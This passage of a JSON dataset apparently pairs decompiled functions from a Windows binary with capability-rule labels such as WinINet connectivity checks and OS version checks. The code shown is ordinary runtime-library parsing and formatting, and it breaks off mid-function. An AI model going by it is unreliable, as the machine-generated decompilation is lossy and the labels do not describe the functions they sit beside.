        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.00404156(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch, \n            uint arg_20h, uint32_t arg_24h, uint noname_8, uint arg_2ch, uint arg_30h)\n\n{\n    uint *puVar1;\n    int32_t arg_8h_00;\n    uint32_t in_ECX;\n    uint arg_2ch_00;\n    uint uVar2;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    if ((((arg_ch == 0) || (arg_10h == 0)) || (arg_14h == 0)) || (arg_18h == 0)) {\n        puVar1 = fcn.004039a4();\n        uVar2 = 0x16;\n        *puVar1 = 0x16;\n        fcn.00403751();\n    }\n    else {\n        var_4h = in_ECX;\n        if (((arg_1ch == 0x41) || (arg_1ch == 0x45)) ||\n           ((arg_1ch == 0x46 || (var_4h = in_ECX & 0xffffff00,  arg_1ch == 0x47)))) {\n            var_4h = CONCAT31(var_4h._1_3_, 1);\n        }\n        if (((arg_24h & 8) == 0) && (arg_8h_00 = fcn.00404444(arg_8h),  arg_8h_00 != 0)) {\n            var_8h._1_3_ = in_ECX >> 8;\n            if ((*(arg_8h + 4) < 1) && (*(arg_8h + 4) < 0)) {\n                var_8h = CONCAT31(var_8h._1_3_, 1);\n            }\n            else {\n                var_8h = var_8h._1_3_ << 8;\n            }\n            uVar2 = fcn.004c350d(arg_8h_00, var_8h, arg_ch, arg_10h, var_4h);\n        }\n        else {\n            if ((arg_24h & 0x10) == 0) {\n                uVar2 = 2;\n            }\n            else {\n                uVar2 = 3;\n            }\n            arg_2ch_00 = 0;\n            if ((arg_24h & 0x20) != 0) {\n                arg_2ch_00 = arg_30h;\n            }\n            if (arg_1ch < 0x62) {\n                if ((arg_1ch == 0x61) || (arg_1ch == 0x41)) {\n                    uVar2 = fcn.004c2be8(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_20h, var_4h, uVar2, arg_2ch, \n                                         arg_2ch_00);\n                    return uVar2;\n                }\n                arg_1ch = arg_1ch + -0x45;\n            }\n            else {\n                arg_1ch = arg_1ch + -0x65;\n            }\n            if (arg_1ch == 0) {\n                uVar2 = fcn.004c2fba(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_20h, var_4h, uVar2, arg_2ch, \n                                     arg_2ch_00);\n            }\n            else if (arg_1ch == 1) {\n                uVar2 = fcn.004c3226(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_20h, arg_2ch, arg_2ch_00);\n            }\n            else {\n                uVar2 = fcn.004c3411(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_20h, var_4h, uVar2, arg_2ch_00, \n                                     arg_2ch);\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 989
    },
    "00404160": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404160(uchar *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        *arg_8h = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.0040288d(in_ECX + 0x464 + uVar1 * 0x10, 1, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 299
    },
    "004041a1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004041a1(int32_t param_1)\n\n{\n    if (*(param_1 + 0x14) != '\\0') {\n        fcn.00406302(*(param_1 + 8));\n        *(param_1 + 0x14) = 0;\n    }\n    return;\n}\n",
        "token_count": 72
    },
    "004041e2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004041e2(int32_t param_1)\n\n{\n    uint *puVar1;\n    \n    if ((*(param_1 + 0x1c) != 0) && (*(param_1 + 0x1c) != 7)) {\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0x16;\n        fcn.00403751();\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 107
    },
    "0040420f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040420f(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 8;\n        iVar1 = *(in_ECX + 0x14);\n        *arg_8h = *(iVar1 + -8);\n        arg_8h[1] = *(iVar1 + -4);\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            puVar3 = fcn.004039a4();\n            *puVar3 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.00403819(in_ECX + 0x464 + uVar2 * 0x10, 2, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar4;\n        }\n        puVar3 = *(in_ECX + 0x46c + uVar2 * 0x10);\n        *arg_8h = *puVar3;\n        arg_8h[1] = puVar3[1];\n    }\n    return 1;\n}\n",
        "token_count": 351
    },
    "00404214": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00404214(uint8_t *arg_8h, uint8_t **arg_ch, uint32_t arg_10h, uint *arg_14h)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint *puVar5;\n    uint32_t uVar6;\n    uint8_t *puVar7;\n    uint8_t *puVar8;\n    uint32_t uVar9;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint8_t *var_8h;\n    uint var_1h;\n    \n    cVar2 = '\\0';\n    if (arg_14h != NULL) {\n        *arg_14h = 0;\n    }\n    uVar1 = *arg_8h;\n    puVar7 = arg_8h;\n    while (iVar3 = fcn.00405cc2(uVar1),  iVar3 != 0) {\n        puVar7 = puVar7 + 1;\n        uVar1 = *puVar7;\n    }\n    var_1h._0_1_ = *puVar7;\n    if ((var_1h == 0x2d) || (var_1h == 0x2b)) {\n        puVar7 = puVar7 + 1;\n    }\n    else {\n        var_1h._0_1_ = 0x2b;\n    }\n    if (((arg_10h < 0) || (arg_10h == 1)) || (0x24 < arg_10h)) {\n        if (arg_ch == NULL) {\n            return 0;\n        }\n        *arg_ch = arg_8h;\n        return 0;\n    }\n    var_8h = puVar7;\n    if (arg_10h < 1) {\n        uVar1 = *puVar7;\n        if (uVar1 != 0x30) {\n            arg_10h = 10;\n            goto code_r0x0048214b;\n        }\n        if ((puVar7[1] != 0x78) && (puVar7[1] != 0x58)) {\n            arg_10h = 8;\n            goto code_r0x00482144;\n        }\n        arg_10h = 0x10;\ncode_r0x0048215d:\n        puVar7 = puVar7 + 2;\n        var_8h = puVar7;\n    }\n    else if (((arg_10h == 0x10) && (*puVar7 == 0x30)) && ((puVar7[1] == 0x78 || (puVar7[1] == 0x58))))\n    goto code_r0x0048215d;\n    for (; uVar1 = *puVar7,  uVar1 == 0x30; puVar7 = puVar7 + 1) {\ncode_r0x00482144:\n    }\ncode_r0x0048214b:\n    var_10h = 0;\n    uVar9 = 0;\n    puVar8 = puVar7;\n    while( true ) {\n        uVar6 = uVar9;\n        uVar9 = arg_10h;\n        uVar4 = fcn.004043fe(uVar1);\n        iVar3 = fcn.004054b6(0x54e768, uVar4, uVar9);\n        if (iVar3 == 0) break;\n        cVar2 = iVar3 + -0x68;\n        puVar8 = puVar8 + 1;\n        uVar1 = *puVar8;\n        uVar9 = uVar6 * arg_10h + cVar2;\n        var_10h = uVar6;\n    }\n    if (var_8h == puVar8) {\n        if (arg_ch != NULL) {\n            *arg_ch = arg_8h;\n        }\n        return 0;\n    }\n    iVar3 = (puVar8 + -*(arg_10h + 0x54e790)) - puVar7;\n    if ((iVar3 < 0) ||\n       (((puVar8 + -*(arg_10h + 0x54e790) == puVar7 || iVar3 < 0 && (uVar6 - cVar2 <= uVar6)) &&\n        ((uVar6 - cVar2) / arg_10h == var_10h)))) {\n        if (var_1h == 0x2d) {\n            uVar6 = -uVar6;\n        }\n    }\n    else {\n        puVar5 = fcn.004039a4();\n        *puVar5 = 0x22;\n        if (arg_14h != NULL) {\n            *arg_14h = 1;\n        }\n        uVar6 = 0xffffffff;\n    }\n    if (arg_ch != NULL) {\n        *arg_ch = puVar8;\n        return uVar6;\n    }\n    return uVar6;\n}\n",
        "token_count": 1139
    },
    "00404232": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_16h\n\nvoid __cdecl fcn.00404232(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    char cVar3;\n    int16_t iVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    char *pcVar9;\n    uchar *puVar10;\n    int32_t unaff_EBP;\n    uint8_t uVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_78h;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_16h;\n    uint var_4h;\n    \n    fcn.0040536c(0x88);\n    iVar8 = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0x94) = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x88) = *(unaff_EBP + 0x14);\n    *(unaff_EBP + -0x80) = *(unaff_EBP + 0x1c);\n    piVar5 = fcn.00404a89(*(unaff_EBP + 0x1c));\n    pcVar2 = *(*piVar5 + 0x14);\n    (**0x573000)(unaff_EBP + -0x78);\n    (*pcVar2)();\n    *(unaff_EBP + -4) = 0;\n    if (*(unaff_EBP + -0x68) == 0) {\n        *(unaff_EBP + -0x90) = 0;\n    }\n    else {\n        uVar12 = fcn.00405691();\n        *(unaff_EBP + -0x90) = uVar12 & 0xffff;\n    }\n    piVar5 = fcn.00403d87(*(unaff_EBP + -0x80));\n    pcVar2 = *(*piVar5 + 0x2c);\n    (**0x573000)(0x54e430, 0x54e44b, unaff_EBP + -0x48);\n    (*pcVar2)();\n    puVar10 = *(unaff_EBP + -0x94);\n    *(unaff_EBP + -0x84) = puVar10;\n    cVar3 = fcn.0040640b(*(unaff_EBP + -0x88));\n    if (cVar3 == '\\0') {\n        if (*(iVar8 + 4) == '\\0') {\n            fcn.004050a1();\n        }\n        iVar4 = *(iVar8 + 6);\n        if (iVar4 == *(unaff_EBP + -0x1a)) {\n            *puVar10 = 0x2b;\n        }\n        else {\n            if (*(iVar8 + 4) == '\\0') {\n                fcn.004050a1();\n                iVar4 = *(iVar8 + 6);\n            }\n            if (iVar4 != *(unaff_EBP + -0x1c)) goto code_r0x00470344;\n            *puVar10 = 0x2d;\n        }\n        *(unaff_EBP + -0x84) = puVar10 + 1;\n        fcn.004027a2();\n    }\ncode_r0x00470344:\n    uVar12 = *(unaff_EBP + 0x18) & 0xe00;\n    *(unaff_EBP + -0x80) = 10;\n    if (uVar12 == 0x400) {\n        uVar11 = 8;\n    }\n    else if (uVar12 == 0x800) {\n        uVar11 = 0x10;\n    }\n    else {\n        uVar11 = -(uVar12 != 0) & 10;\n    }\n    *(unaff_EBP + -0x7a) = 0;\n    cVar3 = fcn.0040640b(*(unaff_EBP + -0x88));\n    if (cVar3 == '\\0') {\n        if (*(iVar8 + 4) == '\\0') {\n            fcn.004050a1();\n        }\n        if (*(iVar8 + 6) != *(unaff_EBP + -0x48)) goto code_r0x0047041a;\n        *(unaff_EBP + -0x79) = 1;\n        *(unaff_EBP + -0x8c) = 1;\n        fcn.004027a2();\n        cVar3 = fcn.0040640b(*(unaff_EBP + -0x88));\n        if (cVar3 != '\\0') {\ncode_r0x00470411:\n            if (uVar11 == 0) {\n                uVar11 = 8;\n                goto code_r0x0047042d;\n            }\n            goto code_r0x00470429;\n        }\n        if (*(iVar8 + 4) == '\\0') {\n            fcn.004050a1();\n        }\n        iVar4 = *(iVar8 + 6);\n        if (iVar4 != *(unaff_EBP + -0x16)) {\n            if (*(iVar8 + 4) == '\\0') {\n                fcn.004050a1();\n                iVar4 = *(iVar8 + 6);\n            }\n            if (iVar4 != *(unaff_EBP + -0x18)) goto code_r0x00470411;\n        }\n        if ((uVar11 != 0) && (uVar11 != 0x10)) goto code_r0x00470429;\n        uVar11 = 0x10;\n        *(unaff_EBP + -0x79) = 0;\n        *(unaff_EBP + -0x8c) = 0;\n        fcn.004027a2();\ncode_r0x0047042d:\n        *(unaff_EBP + -0x80) = ((uVar11 != 8) - 1 & 0xfffffff2) + 0x16;\n    }\n    else {\ncode_r0x0047041a:\n        *(unaff_EBP + -0x79) = 0;\n        *(unaff_EBP + -0x8c) = 0;\n        if (uVar11 != 0) {\ncode_r0x00470429:\n            if (uVar11 != 10) goto code_r0x0047042d;\n        }\n    }\n    fcn.004036e8(1, *(unaff_EBP + -0x8c));\n    *(unaff_EBP + -4) = 1;\n    iVar13 = 0;\n    *(unaff_EBP + -0x8c) = *(unaff_EBP + -0x94) + 0x1f;\n    cVar3 = fcn.0040640b(*(unaff_EBP + -0x88));\n    if (cVar3 == '\\0') {\n        do {\n            if (*(iVar8 + 4) == '\\0') {\n                fcn.004050a1();\n            }\n            uVar12 = fcn.00404be2(unaff_EBP + -0x48, *(iVar8 + 6));\n            if (uVar12 < *(unaff_EBP + -0x80)) {\n                cVar1 = *(unaff_EBP + -0x7a);\n                cVar3 = *(uVar12 + 0x54e430);\n                pcVar9 = *(unaff_EBP + -0x84);\n                *pcVar9 = cVar3;\n                if (((cVar1 != '\\0') || (cVar3 != '0')) && (pcVar9 < *(unaff_EBP + -0x8c))) {\n                    *(unaff_EBP + -0x7a) = 1;\n                    *(unaff_EBP + -0x84) = pcVar9 + 1;\n                }\n                iVar6 = unaff_EBP + -0x60;\n                *(unaff_EBP + -0x79) = 1;\n                if (0xf < *(unaff_EBP + -0x4c)) {\n                    iVar6 = *(unaff_EBP + -0x60);\n                }\n                if (*(iVar6 + iVar13) != '\\x7f') {\n                    iVar6 = unaff_EBP + -0x60;\n                    if (0xf < *(unaff_EBP + -0x4c)) {\n                        iVar6 = *(unaff_EBP + -0x60);\n                    }\n                    *(iVar6 + iVar13) = *(iVar6 + iVar13) + '\\x01';\n                }\n            }\n            else {\n                uVar12 = *(unaff_EBP + -0x4c);\n                iVar6 = *(unaff_EBP + -0x60);\n                iVar7 = unaff_EBP + -0x60;\n                if (0xf < uVar12) {\n                    iVar7 = iVar6;\n                }\n                if ((*(iVar7 + iVar13) == '\\0') || (*(unaff_EBP + -0x90) == 0)) goto code_r0x00470565;\n                iVar4 = *(iVar8 + 6);\n                if (*(iVar8 + 4) == '\\0') {\n                    fcn.004050a1();\n                    iVar4 = *(iVar8 + 6);\n                    uVar12 = *(unaff_EBP + -0x4c);\n                    iVar6 = *(unaff_EBP + -0x60);\n                }\n                if (iVar4 != *(unaff_EBP + -0x90)) goto code_r0x00470565;\n                fcn.00404476(0);\n                iVar13 = iVar13 + 1;\n            }\n            fcn.004027a2();\n            cVar3 = fcn.0040640b(*(unaff_EBP + -0x88));\n        } while (cVar3 == '\\0');\n        uVar12 = *(unaff_EBP + -0x4c);\n        iVar6 = *(unaff_EBP + -0x60);\ncode_r0x00470565:\n        if (iVar13 != 0) {\n            iVar8 = unaff_EBP + -0x60;\n            if (0xf < uVar12) {\n                iVar8 = iVar6;\n            }\n            if (*(iVar8 + iVar13) < '\\x01') {\n                cVar3 = '\\0';\n                goto code_r0x00470589;\n            }\n            iVar13 = iVar13 + 1;\n        }\n    }\n    else {\n        uVar12 = *(unaff_EBP + -0x4c);\n        iVar6 = *(unaff_EBP + -0x60);\n    }\n    cVar3 = *(unaff_EBP + -0x79);\ncode_r0x00470589:\n    pcVar9 = unaff_EBP + -0x78;\n    if (0xf < *(unaff_EBP + -100)) {\n        pcVar9 = *(unaff_EBP + -0x78);\n    }\n    if (cVar3 == '\\0') {\ncode_r0x00470600:\n        puVar10 = *(unaff_EBP + -0x94);\n    }\n    else {\n        while ((iVar13 != 0 && (cVar3 = *pcVar9,  cVar3 != '\\x7f'))) {\n            iVar13 = iVar13 + -1;\n            if (iVar13 != 0) {\n                *(unaff_EBP + -0x80) = unaff_EBP + -0x60;\n                if (0xf < uVar12) {\n                    uVar12 = *(unaff_EBP + -0x4c);\n                    *(unaff_EBP + -0x80) = *(unaff_EBP + -0x60);\n                }\n                iVar6 = *(unaff_EBP + -0x60);\n                if (cVar3 != *(*(unaff_EBP + -0x80) + iVar13)) goto code_r0x00470600;\n            }\n            if (iVar13 == 0) {\n                *(unaff_EBP + -0x80) = unaff_EBP + -0x60;\n                if (0xf < *(unaff_EBP + -0x4c)) {\n                    *(unaff_EBP + -0x80) = iVar6;\n                }\n                uVar12 = *(unaff_EBP + -0x4c);\n                if (cVar3 < **(unaff_EBP + -0x80)) goto code_r0x00470600;\n            }\n            if ('\\0' < pcVar9[1]) {\n                pcVar9 = pcVar9 + 1;\n            }\n        }\n        puVar10 = *(unaff_EBP + -0x84);\n        if (*(unaff_EBP + -0x7a) == '\\0') {\n            *puVar10 = 0x30;\n            puVar10 = puVar10 + 1;\n        }\n    }\n    *puVar10 = 0;\n    fcn.004029b9();\n    fcn.004029b9();\n    fcn.004067d0();\n    return;\n}\n",
        "token_count": 3004
    },
    "0040423c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Removing unreachable block (ram,0x00482506)\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __cdecl fcn.0040423c(uint8_t *arg_8h, uint8_t **arg_ch, int32_t arg_10h, uint *arg_14h)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint *puVar6;\n    uint8_t *puVar7;\n    uint8_t *puVar8;\n    uint8_t *puVar9;\n    int64_t iVar10;\n    uint64_t uVar11;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_2h;\n    \n    if (arg_14h != NULL) {\n        *arg_14h = 0;\n    }\n    uVar3 = *arg_8h;\n    puVar7 = arg_8h;\n    while (iVar4 = fcn.00405cc2(uVar3),  iVar4 != 0) {\n        puVar7 = puVar7 + 1;\n        uVar3 = *puVar7;\n    }\n    var_2h._0_1_ = *puVar7;\n    if ((var_2h == 0x2d) || (var_2h == 0x2b)) {\n        puVar7 = puVar7 + 1;\n    }\n    else {\n        var_2h._0_1_ = 0x2b;\n    }\n    if (((arg_10h < 0) || (arg_10h == 1)) || (0x24 < arg_10h)) {\n        if (arg_ch == NULL) {\n            return 0;\n        }\n        *arg_ch = arg_8h;\n        return 0;\n    }\n    if (arg_10h < 1) {\n        if (*puVar7 != 0x30) {\n            arg_10h = 10;\n            goto code_r0x00482447;\n        }\n        if ((puVar7[1] != 0x78) && (puVar7[1] != 0x58)) {\n            arg_10h = 8;\n            goto code_r0x00482447;\n        }\n        arg_10h = 0x10;\n    }\n    else if (((arg_10h != 0x10) || (*puVar7 != 0x30)) || ((puVar7[1] != 0x78 && (puVar7[1] != 0x58))))\n    goto code_r0x00482447;\n    puVar7 = puVar7 + 2;\ncode_r0x00482447:\n    uVar3 = *puVar7;\n    puVar8 = puVar7;\n    while (uVar3 == 0x30) {\n        puVar8 = puVar8 + 1;\n        uVar3 = *puVar8;\n    }\n    var_2h._1_1_ = '\\0';\n    puVar9 = puVar8;\n    uVar11 = 0;\n    uVar2 = 0;\n    while( true ) {\n        uVar1 = uVar11;\n        iVar4 = arg_10h;\n        uVar5 = fcn.004043fe(uVar3);\n        iVar4 = fcn.004054b6(\"0123456789abcdefghijklmnopqrstuvwxyz\", uVar5, iVar4);\n        if (iVar4 == 0) break;\n        var_2h._1_1_ = iVar4 + '<';\n        iVar10 = fcn.0040262b();\n        puVar9 = puVar9 + 1;\n        uVar3 = *puVar9;\n        uVar11 = iVar10 + var_2h._1_1_;\n        uVar2 = uVar1;\n    }\n    if (puVar7 == puVar9) {\n        if (arg_ch != NULL) {\n            *arg_ch = arg_8h;\n        }\n        return 0;\n    }\n    iVar4 = (puVar9 + -*(arg_10h + 0x54e7ec)) - puVar8;\n    if ((iVar4 < 0) ||\n       (((puVar9 + -*(arg_10h + 0x54e7ec) == puVar8 || iVar4 < 0 && (uVar1 - var_2h._1_1_ <= uVar1)) &&\n        (uVar11 = fcn.00404782(uVar1 - var_2h._1_1_, arg_10h, 0),  uVar11 == uVar2)))) {\n        if (var_2h == 0x2d) {\n            uVar1 = CONCAT44(-((uVar1 >> 0x20) + (uVar1 != 0)), -uVar1);\n        }\n    }\n    else {\n        puVar6 = fcn.004039a4();\n        *puVar6 = 0x22;\n        if (arg_14h != NULL) {\n            *arg_14h = 1;\n        }\n        uVar1 = 0xffffffffffffffff;\n    }\n    if (arg_ch != NULL) {\n        *arg_ch = puVar9;\n        return uVar1;\n    }\n    return uVar1;\n}\n",
        "token_count": 1212
    },
    "00404287": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00404287(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_14h;\n    int32_t iVar1;\n    int32_t var_20h;\n    int32_t *var_1ch;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    fcn.004057e5(arg_10h);\n    if ((arg_8h < -1) || (0xff < arg_8h)) {\n        if (*(*var_1ch + (arg_8h >> 8 & 0xffU) * 2) < 0) {\n            var_10h._2_1_ = 0;\n            arg_14h = 2;\n            var_10h._0_1_ = arg_8h >> 8;\n            var_10h._1_1_ = arg_8h;\n        }\n        else {\n            var_10h._1_1_ = 0;\n            arg_14h = 1;\n            var_10h._0_1_ = arg_8h;\n        }\n        var_ch = 0;\n        var_8h._0_2_ = 0;\n        iVar1 = fcn.004012b7(&var_1ch, 1, &var_10h, arg_14h, &var_ch, var_1ch[2], 1);\n        if (iVar1 == 0) {\n            if (var_14h != '\\0') {\n                *(var_20h + 0x350) = *(var_20h + 0x350) & 0xfffffffd;\n            }\n            goto code_r0x004d29ba;\n        }\n    }\n    if (var_14h != '\\0') {\n        *(var_20h + 0x350) = *(var_20h + 0x350) & 0xfffffffd;\n    }\ncode_r0x004d29ba:\n    fcn.00403085(arg_10h);\n    return;\n}\n",
        "token_count": 502
    },
    "004042aa": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004042aa(uint32_t param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t arg_ch;\n    int32_t iVar3;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = param_1;\n    if ((*(param_1 + 0x3c) == '\\0') && (iVar3 = 0,  0 < *(param_1 + 0x38))) {\n        arg_ch = *(param_1 + 0x34);\n        do {\n            var_4h = var_4h & 0xffff0000;\n            iVar2 = fcn.0040105f(&var_4h, arg_ch, *(**(param_1 + 8) + 4), *(param_1 + 8));\n            if (iVar2 < 1) {\n                *(param_1 + 0x18) = 0xffffffff;\n                return 1;\n            }\n            cVar1 = fcn.00401708(var_4h);\n            if (cVar1 == '\\0') {\n                *(param_1 + 0x18) = 0xffffffff;\n            }\n            else {\n                *(param_1 + 0x18) = *(param_1 + 0x18) + 1;\n            }\n            arg_ch = arg_ch + iVar2;\n            iVar3 = iVar3 + 1;\n        } while (iVar3 != *(param_1 + 0x38));\n    }\n    else {\n        fcn.00404043(*(param_1 + 0x34), *(param_1 + 0x38), param_1 + 0x18, param_1 + 0xc);\n    }\n    return 1;\n}\n",
        "token_count": 391
    },
    "0040430e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040430e(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    char cVar1;\n    char *pcVar2;\n    code *pcVar3;\n    uchar uVar4;\n    char cVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    char *pcVar9;\n    uint32_t uVar10;\n    int32_t unaff_EBP;\n    int32_t iVar11;\n    uint32_t uVar12;\n    bool bVar13;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_28h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.0040536c(0x48);\n    pcVar2 = *(unaff_EBP + 0x14);\n    iVar11 = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0x34) = *(unaff_EBP + 8);\n    cVar5 = *pcVar2;\n    *(unaff_EBP + -0x48) = *(unaff_EBP + 0xc);\n    pcVar9 = pcVar2;\n    cVar1 = cVar5;\n    while (cVar1 != '\\0') {\n        if (cVar1 == cVar5) {\n            iVar11 = iVar11 + 1;\n        }\n        pcVar9 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n    }\n    *(unaff_EBP + -0x3c) = iVar11;\n    fcn.004036e8(iVar11, 0);\n    *(unaff_EBP + -4) = 1;\n    uVar6 = fcn.00404ed5(1);\n    *(unaff_EBP + -0x4c) = uVar6;\n    *(unaff_EBP + -4) = 2;\n    uVar6 = fcn.004035a8(unaff_EBP + -0x50);\n    *(unaff_EBP + -0x38) = uVar6;\n    *(unaff_EBP + -4) = 0;\n    fcn.004050a6();\n    *(unaff_EBP + -0x40) = 0xfffffffe;\n    uVar10 = 1;\n    *(unaff_EBP + -0x30) = 1;\n    while( true ) {\n        uVar12 = 0;\n        iVar11 = 0;\n        *(unaff_EBP + -0x29) = 0;\n        *(unaff_EBP + -0x44) = 0;\n        if (*(unaff_EBP + -0x3c) == 0) break;\n        do {\n            cVar5 = pcVar2[iVar11];\n            if (cVar5 != '\\0') {\n                do {\n                    if (cVar5 == *pcVar2) break;\n                    iVar11 = iVar11 + 1;\n                    cVar5 = pcVar2[iVar11];\n                } while (cVar5 != '\\0');\n            }\n            bVar13 = 0xf < *(unaff_EBP + -0x14);\n            iVar7 = unaff_EBP + -0x28;\n            if (0xf < *(unaff_EBP + -0x14)) {\n                iVar7 = *(unaff_EBP + -0x28);\n            }\n            if (*(iVar7 + uVar12) == '\\0') {\n                iVar11 = iVar11 + uVar10;\n                if ((pcVar2[iVar11] == *pcVar2) || (pcVar2[iVar11] == '\\0')) {\n                    if (0x7e < uVar10) {\n                        uVar10 = 0x7f;\n                    }\n                    iVar7 = unaff_EBP + -0x28;\n                    if (bVar13) {\n                        iVar7 = *(unaff_EBP + -0x28);\n                    }\n                    *(iVar7 + uVar12) = uVar10;\n                    uVar10 = *(unaff_EBP + 